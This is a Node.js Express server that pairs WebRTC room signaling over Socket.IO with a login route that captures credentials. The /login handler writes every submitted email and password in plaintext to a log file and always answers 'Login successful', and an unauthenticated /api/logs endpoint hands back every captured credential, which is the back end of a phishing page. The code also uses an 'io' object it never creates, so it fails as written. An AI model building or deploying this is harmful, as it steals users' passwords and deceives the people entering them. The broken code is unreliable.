const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const http = require('http');
const socketIO = require('socket.io');

const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Login endpoint - stores credentials and always accepts
app.post('/login', (req, res) => {
    const { email, password } = req.body;
    
    const logEntry = `[${new Date().toISOString()}] Email: ${email}, Password: ${password}\n`;
    
    fs.appendFile('logs/credentials.log', logEntry, (err) => {
        if (err) {
            console.error('Error logging credentials:', err);
        }
    });
    
    res.json({ success: true, message: 'Login successful' });
});

// API endpoint to get logs as JSON
app.get('/api/logs', (req, res) => {
    const logPath = path.join(__dirname, 'logs', 'credentials.log');
    
    if (fs.existsSync(logPath)) {
        const logs = fs.readFileSync(logPath, 'utf8');
        const entries = logs.trim().split('\n').filter(line => line.length);
        res.json({ logs: entries });
    } else {
        res.json({ logs: [] });
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Store room participants
const rooms = new Map();

// Socket.IO signaling
io.on('connection', (socket) => {
    console.log('User connected:', socket.id);
    
    socket.on('join-room', (roomId) => {
        socket.join(roomId);
        
        if (!rooms.has(roomId)) {
            rooms.set(roomId, new Set());
        }
        
        const participants = rooms.get(roomId);
        participants.add(socket.id);
        
        const otherParticipants = Array.from(participants).filter(id => id !== socket.id);
        
        socket.emit('room-joined', {
            roomId: roomId,
            participants: Array.from(participants),
            isFirst: participants.size === 1
        });
        
        if (otherParticipants.length > 0) {
            socket.to(roomId).emit('user-joined', {
                userId: socket.id,
                participants: Array.from(participants)
            });
        }
    });
    
    socket.on('leave-room', (roomId) => {
        socket.leave(roomId);
        
        if (rooms.has(roomId)) {
            rooms.get(roomId).delete(socket.id);
            if (rooms.get(roomId).size === 0) {
                rooms.delete(roomId);
            }
        }
        
        socket.to(roomId).emit('user-left', socket.id);
    });
    
    socket.on('offer', (data) => {
        socket.to(data.target).emit('offer', {
            offer: data.offer,
            from: socket.id
        });
    });
    
    socket.on('answer', (data) => {
        socket.to(data.target).emit('answer', {
            answer: data.answer,
            from: socket.id
        });
    });
    
    socket.on('ice-candidate', (data) => {
        socket.to(data.target).emit('ice-candidate', {
            candidate: data.candidate,
            from: socket.id
        });
    });
    
    socket.on('disconnect', () => {
        for (const [roomId, participants] of rooms.entries()) {
            if (participants.has(socket.id)) {
                participants.delete(socket.id);
                if (participants.size === 0) {
                    rooms.delete(roomId);
                }
                socket.to(roomId).emit('user-left', socket.id);
            }
        }
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
});